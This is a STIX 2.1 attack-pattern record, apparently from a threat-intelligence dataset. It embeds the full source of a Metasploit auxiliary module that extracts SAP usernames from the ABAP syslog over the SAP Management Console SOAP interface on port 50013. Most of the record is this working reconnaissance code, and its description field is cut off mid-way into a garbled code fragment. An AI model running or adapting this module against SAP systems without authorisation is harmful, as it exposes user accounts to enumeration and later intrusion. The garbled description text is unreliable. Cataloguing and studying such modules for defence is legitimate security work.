{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--32fbcedd-37d5-4a1e-ac54-8d94244883e5",
    "created": "2024-08-14T16:27:01.273991Z",
    "modified": "2024-08-14T16:27:01.273995Z",
    "name": "SAP Management Console Extract Users",
    "description": " This module simply attempts to extract SAP users from the ABAP Syslog through the SAP Management Console SOAP Interface.  'References'   => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_mgmt_con_extractusers.rb",
            "external_id": "sap_mgmt_con_extractusers.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'SAP Management Console Extract Users',\n      'Description'  =>  %q{\n        This module simply attempts to extract SAP users from the ABAP\n        Syslog through the SAP Management Console SOAP Interface.\n        },\n      'References'   =>\n        [\n          # General\n          [ 'URL', 'https://blog.c22.cc' ]\n        ],\n      'Author'       => [ 'Chris John Riley' ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),\n      ])\n    register_autofilter_ports([ 50013 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI']),\n      'method'  => 'GET'\n    }, 25)\n\n    if not res\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n      return\n    end\n\n    extractusers(ip)\n  end\n\n  def extractusers(rhost)\n    print_status(\"#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface\")\n    success = false\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:ABAPReadSyslog'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi + '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_raw({\n        'uri'      => normalize_uri(datastore['URI']),\n        'method'   => 'POST',\n        'data'     => data,\n        'headers'  =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'\t=> '\"\"',\n            'Content-Type'  => 'text/xml; charset=UTF-8',\n          }\n      }, 60)\n\n      env = []\n\n      if res and res.code == 200\n        case res.body\n        when nil\n          # Nothing\n        when/<User>([^<]+)<\\/User>/i\n          body = []\n          body = res.body unless res.body.nil?\n          users = body.scan(/<User>([^<]+)<\\/User>/i)\n          users = users.uniq\n          success = true\n        end\n      elsif res and res.code == 500\n        case res.body\n        when /<faultstring>(.*)<\\/faultstring>/i\n          faultcode = \"#{$1}\"\n          fault = true\n        end\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to attempt authentication on #{rhost}:#{rport}\")\n      return\n    end\n\n    if success\n      print_good(\"#{rhost}:#{rport} [SAP] Users Extracted: #{users.length} entries extracted from #{rhost}:#{rport}\")\n      report_note(\n        :host => rhost,\n        :proto => 'tcp',\n        :port => rport,\n        :type => 'sap.users',\n        :data => {:proto => \"soap\", :users => users},\n        :update => :unique_data\n      )\n\n      users.each do |output|\n        print_good(\"#{rhost}:#{rport} [SAP] Extracted User: #{output[0]}\")\n      end\n      return\n    elsif fault\n      print_error(\"#{rhost}:#{rport} [SAP] Error code: #{faultcode}\")\n      return\n    else\n      print_error(\"#{rhost}#{rport} [SAP] failed to access ABAPSyslog on #{rhost}:#{rport}\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ]
}